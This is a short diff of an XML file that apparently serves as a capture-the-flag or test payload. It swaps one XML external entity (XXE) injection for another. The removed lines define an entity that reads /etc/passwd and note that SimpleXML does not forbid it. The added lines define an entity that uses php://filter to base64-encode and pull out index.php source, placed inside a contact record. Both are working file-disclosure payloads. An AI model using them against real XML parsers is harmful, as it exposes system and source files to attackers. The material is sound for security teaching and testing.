@@ -1,8 +1,10 @@
-<?xml version="1.0" encoding="UTF-8"?>
-			<!DOCTYPE user [<!ENTITY internal SYSTEM 'file:///etc/passwd'>]>  
-			<example index="123">
-				<!-- SimpleXML didn't forbid external entity in xml elements-->
-				<text>Example message:&internal;</text> 
-				<flag>false</flag> 
-				<slist class="java.util.ArrayList"/> 
-			</example> 
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <address>42 rue du CTF</address>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
